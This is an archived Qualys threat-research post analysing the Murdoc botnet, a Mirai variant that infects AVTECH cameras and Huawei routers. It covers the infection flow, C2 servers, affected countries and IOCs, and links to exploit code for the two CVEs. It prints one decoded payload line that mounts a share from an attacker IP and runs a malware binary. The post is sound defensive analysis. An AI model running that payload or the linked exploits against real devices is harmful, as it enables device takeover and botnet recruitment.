---
url: "https://blog.qualys.com/vulnerabilities-threat-research/2025/01/21/mass-campaign-of-murdoc-botnet-mirai-a-new-variant-of-corona-mirai"
title: "Mass Campaign of Murdoc Botnet Mirai: A New Variant of Corona Mirai | Qualys"
site: "Qualys"
published: "2025-01-21T16:05:36+00:00"
captured: "2026-11-02T18:22:55Z"
via: "live"
sha256: "053f12198fb96e9fd07fdc9409b9499a62699bd71b9243cb3d36e20e39e412cf"
wayback: "https://web.archive.org/web/20260902113947/https://blog.qualys.com/vulnerabilities-threat-research/2025/01/21/mass-campaign-of-murdoc-botnet-mirai-a-new-variant-of-corona-mirai"
cited_in:
  - "docs/threats/05-malware-families-and-detection.md"
---

# Mass Campaign of Murdoc Botnet Mirai: A New Variant of Corona Mirai | Qualys

> Archived copy of a third-party page, kept so Bigman's findings survive if the original goes away. Copyright stays with the original publisher; cite the original URL.
>
> Original: <https://blog.qualys.com/vulnerabilities-threat-research/2025/01/21/mass-campaign-of-murdoc-botnet-mirai-a-new-variant-of-corona-mirai>
> Snapshot: <https://web.archive.org/web/20260902113947/https://blog.qualys.com/vulnerabilities-threat-research/2025/01/21/mass-campaign-of-murdoc-botnet-mirai-a-new-variant-of-corona-mirai>

# Mass Campaign of Murdoc Botnet Mirai: A New Variant of Corona Mirai

[Shilpesh Trivedi](https://blog.qualys.com/author/strivedi), Lead Security Researcher, Qualys

January 22, 2025 - 7 min read

- https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fblog.qualys.com%2Fvulnerabilities-threat-research%2F2025%2F01%2F21%2Fmass-campaign-of-murdoc-botnet-mirai-a-new-variant-of-corona-mirai
- https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fblog.qualys.com%2Fvulnerabilities-threat-research%2F2025%2F01%2F21%2Fmass-campaign-of-murdoc-botnet-mirai-a-new-variant-of-corona-mirai
- https://twitter.com/share?url=https%3A%2F%2Fblog.qualys.com%2Fvulnerabilities-threat-research%2F2025%2F01%2F21%2Fmass-campaign-of-murdoc-botnet-mirai-a-new-variant-of-corona-mirai&text=Mass%20Campaign%20of%20Murdoc%20Botnet%20Mirai%3A%20A%20New%20Variant%20of%20Corona%20Mirai&via=qualys
-

#### Table of Contents

- [Overview of the latest Murdoc Botnet campaign and a historical timeline](https://blog.qualys.com/vulnerabilities-threat-research/2025/01/21/mass-campaign-of-murdoc-botnet-mirai-a-new-variant-of-corona-mirai#overview-of-the-latest-murdoc-botnet-campaign-and-a-historical-timeline)
- [Technical campaign analysis](https://blog.qualys.com/vulnerabilities-threat-research/2025/01/21/mass-campaign-of-murdoc-botnet-mirai-a-new-variant-of-corona-mirai#technical-campaign-analysis)
- [Command-and-control analysis](https://blog.qualys.com/vulnerabilities-threat-research/2025/01/21/mass-campaign-of-murdoc-botnet-mirai-a-new-variant-of-corona-mirai#command-and-control-analysis)
- [Murdoc Botnet](https://blog.qualys.com/vulnerabilities-threat-research/2025/01/21/mass-campaign-of-murdoc-botnet-mirai-a-new-variant-of-corona-mirai#murdoc-botnet)
- [In-depth shell script analysis:](https://blog.qualys.com/vulnerabilities-threat-research/2025/01/21/mass-campaign-of-murdoc-botnet-mirai-a-new-variant-of-corona-mirai#in-depth-shell-script-analysis)
- [Affected Countries](https://blog.qualys.com/vulnerabilities-threat-research/2025/01/21/mass-campaign-of-murdoc-botnet-mirai-a-new-variant-of-corona-mirai#affected-countries)
- [Qualys EDR Coverage](https://blog.qualys.com/vulnerabilities-threat-research/2025/01/21/mass-campaign-of-murdoc-botnet-mirai-a-new-variant-of-corona-mirai#qualys-edr-coverage)
- [Conclusion & Recommended Steps to Protect Against the Variant](https://blog.qualys.com/vulnerabilities-threat-research/2025/01/21/mass-campaign-of-murdoc-botnet-mirai-a-new-variant-of-corona-mirai#conclusion-recommended-steps-to-protect-against-the-variant)
- [IOCs](https://blog.qualys.com/vulnerabilities-threat-research/2025/01/21/mass-campaign-of-murdoc-botnet-mirai-a-new-variant-of-corona-mirai#iocs)
- [IPs](https://blog.qualys.com/vulnerabilities-threat-research/2025/01/21/mass-campaign-of-murdoc-botnet-mirai-a-new-variant-of-corona-mirai#ips)
- [Contributors:](https://blog.qualys.com/vulnerabilities-threat-research/2025/01/21/mass-campaign-of-murdoc-botnet-mirai-a-new-variant-of-corona-mirai#contributors)

The Qualys Threat Research Unit has uncovered a large-scale, ongoing operation within the Mirai campaign, dubbed Murdoc Botnet. This variant exploits vulnerabilities targeting AVTECH Cameras and Huawei HG532 routers. It demonstrates enhanced capabilities, exploiting vulnerabilities to compromise devices and establish expansive botnet networks. In this blog, we will explore Murdoc Botnet’s propagation methods and attack vectors.

## Overview of the latest Murdoc Botnet campaign and a historical timeline

In this latest campaign we note the utilization of ELF file and Shell Script execution, which leads to the deployment of the botnet sample. This technique was already seen in 2024 when the attackers exploited the same vulnerabilities to load their malware payload on the targeted devices.

https://blog.qualys.com/wp-content/uploads/2025/01/image1.png

Figure 1: Attack timeline

The diagram above conveys the percentage of increased and decreased attacks per month relative to the previous month.

## Technical campaign analysis

During routine hunting analysis, the Qualys Threat Research team uncovered evidence of an ongoing live campaign for Mirai, which commenced in July 2024.

With the help of the below FOFA query, we discovered that around 1300+ IPs were found active on this campaign.

https://blog.qualys.com/wp-content/uploads/2025/01/image2.png

Figure 2: FOFA Query

## Command-and-control analysis

The Qualys Threat Research Team uncovered the presence of 100+ distinct sets of servers, each tasked with deciphering its activities and establishing communication with one of the compromised IPs implicated in this ongoing campaign. These servers facilitated the distribution of Mirai malware.

https://blog.qualys.com/wp-content/uploads/2025/01/image3.png

Figure 3: Embedded payloads

The above-mentioned figure shows the complete details of identified command-and-control servers, with respective payload content to the final URL, which drops the Mirai malware.

## Murdoc Botnet

Mirai malware, here dubbed as Murdoc Botnet, is a prominent malware family for *nix systems. It mainly targets vulnerable AVTECH and Huawei devices. This botnet also uses some existing exploits ([CVE-2024-7029](https://github.com/R00tS3c/DDOS-RootSec/blob/master/Botnets/Exploits/avtech.py), [CVE-2017-17215](https://www.exploit-db.com/exploits/43414)) to download the next-stage payloads.

https://blog.qualys.com/wp-content/uploads/2025/01/image4.png

Figure 4: Huawei Exploit inside binary (CVE-2017-17215)

Figure 5: Embedding Payloads by exploiting CVE-2024-7029

Figure 6: Base64 encoded commands

The decoded base64 encoded payload is:

cd /tmp; mkdir skid; mount -o intr,nolock,tcp,exec 45.148.121.58:/root/static skid; cd skid; ./meow.arm5 avtech;

The payload indicates that it is targeting AVTECH cameras.

In Figures 4 and Figure 5, we can see the embedded command line injection for the AVTECH camera, by which the malware binary:

- Using the wget/ftpget command, fetches the shellscript file.
- Executes it and removes it.

We discovered 500+ samples containing ELF files and ShellScript files. Each ShellScript is loaded onto devices such as IP cameras, Network devices, and IoT devices, and, in turn, the C2 server loads the new variant of Mirai botnet, i.e., Murdoc Botnet, into the devices. We have analyzed several samples; all use the same mechanism as the infection flow.

## In-depth shell script analysis:

https://blog.qualys.com/wp-content/uploads/2025/01/image7.png

Figure 7: Bash Script

https://blog.qualys.com/wp-content/uploads/2025/01/image8.png

Figure 8: Bash scripts indicate that the sample is targeting TPLINK

Typically, as mentioned in the figures above, the malware shell script uses GTFOBins and does the following:

- Using wget command, fetches the payload.
- Gives the execution permission to the payload using the chmod command.
- Executes the payload.
- Removes the payload.

Figure 9: Botnet Deployment sample

## Affected Countries

Upon a thorough examination of the IP addresses associated with the campaign activity, the Qualys Threat Research Team unveiled the geographical distribution of affected countries, with Malaysia occupying the foremost position, followed by Thailand, Mexico, and Indonesia.

https://blog.qualys.com/wp-content/uploads/2025/01/image10.png

Figure 10: Affected Countries

## Qualys EDR Coverage

Qualys EDR detects the Murdoc Botnet Mirai malware variant.

https://blog.qualys.com/wp-content/uploads/2025/01/image11.png

Figure 11: Qualys Detection

https://blog.qualys.com/wp-content/uploads/2025/01/image12.png

Figure 12: Multiple network connections detected by the sample

## Conclusion & Recommended Steps to Protect Against the Variant

Our research initially started with the discovery and analysis of Murdoc Botnet binaries used for DDOS activities. Using Qualys EDR, threat intelligence data, and open-source intelligence (OSINT), we were able to attribute Murdoc Botnet as a Mirai variant.

We recommend the following measures for enterprise users and administrators to identify and protect against such attacks:

- Regularly monitor the suspicious processes, events, and network traffic spawned by the execution of any untrusted binary/scripts.
- Always be cautious in executing shell scripts from unknown or untrusted sources.
- Keep systems and firmware updated with the latest releases and patches.

## IOCs

We have found 300+ x86 samples and 40+ x86_64 samples. Below are a few for your reference.

| sha256 |

| c9fe390890a8b0586e8d5ac410685a7c4ed147858b10eb75459fa1afca8dc84d |

| c0ae1eb249705f61d45ca747c91c02a411557a28792f4064c1d647abb580bc10 |

| f5aa93311d8dcde50d87ec010274fdd7a7653eed51264f0e2e648403ec4177d0 |

| 76ebd9695aef87cc975d63b3a7a9ecc7d31bcd53a29e70ba97464a61e102cf52

| 7b1c7eb73f5d668c11af8f7131883863774902883ad95aa520a1eb203cf50fe1

| 10a08485432392fed90f3f3aaa7903566c57df5b27ed329a7d26a5b549d277e9

| b63c93206417321b6e35e1accb8f667810c3e8a93978070d24f8382cc3d488dd

| e127153563c1e9352067e94b28687828514734d583ca6bd89ad6e9b01be46170

| 34881ca6cff31098ed669fc379ca8b9d319aab5f14e0fb7d0b107a20ff1130e9

| a49ef0e44fd98c411c6db940018183e9ec06af7f6f3a4c1ae0b92d745e697066

| 61c6767e74615917e29fc2d2342119ec81fa6794752966d4d7c9ef02545a4701

| 54fea8da696ddf115893858af924296d9229846cbd8afceca990a381b3363eb3

| 60fad3d03171353efea70a0e9a0c511d34c3bbd8f9f57bfa6e8d989cd858ba14

| e4504f9329e03f782a75dd10cc4f849e17ef9a116b3b05dcc82e5d82c846ef68

| 2c365aded5c3f7422c72261c678b42edb2311ac9b2c0b9af444e5b3c2d734bd0

| 8f680ed38fa9229b7b3b53bf730526be633ff635c35df8537ef98ffb3e58e170

| e87ad8c9586eeae7981ca0576764ceeeff93bbfcfa385703c5901b8d86d0194d

| 6b8ef346df6c002aaba3bcf91bed0ce8078a76e4600bcf86c08a6eef80d4c77a

| 60dc6802d55f1130f47ee631c245328250951e5d300942177fedae1845ab7912

| 5234086aff9cd88b6b25fa068a860e91f5faf8d457df60cb207b329c69c27c0d

| c3b9ffca2b7f5c9fdefb39d6c13d657769ec140efd4513842dbc68adbad99efa

| 69405c640e224c981555509bd088ef759c584228f989e46d89e83483f9c2e4b7

| 978167c28a9c8f6f111ad18e1682d904989e8d72020e30144e1c0c8bb7fd3952

| 22ff790406cee6d81e191ef7e344e10bc722821506e5f7979e224747a21d8a87

| f4308b08c0ca971a1420a5dca779d88b8172c29bc7238b723b43bb96d9b9a9e0

| 5577a035d1a5023edc5a404694ff4ed45a6b250bfce00f87a42b087e419970d0

| 5d6a900988bc42ad3e2b08253f01fa8090d0abc112d06410dd5d4e9f7aa02c42

| b979fd33cb526a10ce9afbf3855d06c881b1bf55b0b6b1d10ebba5dc0d01c0c2

| 6552b87ddc2e6442e163c99e780f2549de5b78b56b8b91d8743ce61c55b1b558

| b8b5efbeaffa06e67f7801476b062926cd3e26ff7d16968d6c4fe6aa8f6856eb

| dc90a8edca7c5185dcca104cee44930f750e48b53d6ee712b3fcd8a6e6305225

| 99a0ab2a04a9cae3666a4baf52d35b4c623f1f41b5eb1519156ebe02d2afeceb

| 0db611e84182be1d6726c272214ae7977fc19b325ba0fc96f458a37365d7c4f2

| ffa702f8681a58b52e70e445fc4daa8c2e909d6b20ab3eee635959f66672fd27

| 6230cf081bf077de1ad2a42fc0b0f04aeb213855373ebaa26ebff797a5d4096f

## IPs

| 121[.]163[.]127[.]5 | 144[.]202[.]68[.]196 | 185[.]216[.]70[.]121

| 154[.]216[.]18[.]196 | 103[.]138[.]46[.]11 | 185[.]132[.]125[.]229

| 175[.]106[.]11[.]242 | 31[.]162[.]170[.]37 | 181[.]197[.]159[.]183

| 113[.]98[.]105[.]213 | 47[.]90[.]43[.]134 | 87[.]121[.]112[.]77

| 78[.]134[.]4[.]112 | 45[.]141[.]157[.]105 | 156[.]96[.]155[.]238

| 124[.]33[.]173[.]242 | 45[.]201[.]209[.]37 | 45[.]87[.]41[.]8

| 194[.]55[.]186[.]222 | 77[.]61[.]147[.]141 | 92[.]38[.]135[.]46

| 117[.]54[.]226[.]50 | 45[.]125[.]66[.]129 | 78[.]97[.]33[.]45

| 58[.]152[.]186[.]135 | 46[.]32[.]47[.]226 | 204[.]93[.]164[.]31

| 182[.]155[.]250[.]21 | 92[.]66[.]72[.]172 | 45[.]152[.]112[.]110

| 204[.]76[.]203[.]3 | 122[.]117[.]142[.]237 | 211[.]143[.]198[.]208

| 124[.]223[.]106[.]247 | 92[.]109[.]2[.]218 | 182[.]234[.]183[.]31

| 202[.]162[.]33[.]243 | 203[.]131[.]215[.]35 | 103[.]114[.]160[.]250

| 85[.]209[.]43[.]178 | 154[.]216[.]19[.]108 | 211[.]143[.]198[.]163

| 38[.]6[.]224[.]248 | 92[.]119[.]159[.]25 | 38[.]6[.]224[.]24

| 36[.]95[.]130[.]197 | 45[.]202[.]35[.]86 | 204[.]93[.]201[.]142

| 85[.]209[.]43[.]252 | 154[.]216[.]19[.]225 | 142[.]179[.]80[.]122

| 154[.]216[.]17[.]169 | 185[.]97[.]255[.]159 | 103[.]124[.]107[.]17

| 106[.]0[.]51[.]178 | 62[.]72[.]185[.]39 | 103[.]30[.]43[.]120

| 45[.]202[.]35[.]35 | 91[.]92[.]243[.]49 | 190[.]123[.]46[.]21

| 45[.]141[.]157[.]124 | 89[.]190[.]156[.]211 | 114[.]33[.]8[.]73

| 223[.]153[.]192[.]84 | 59[.]127[.]196[.]190 | 154[.]216[.]17[.]126

## Contributors:

- Siddartha Malladi, Security Researcher, Qualys

### Related
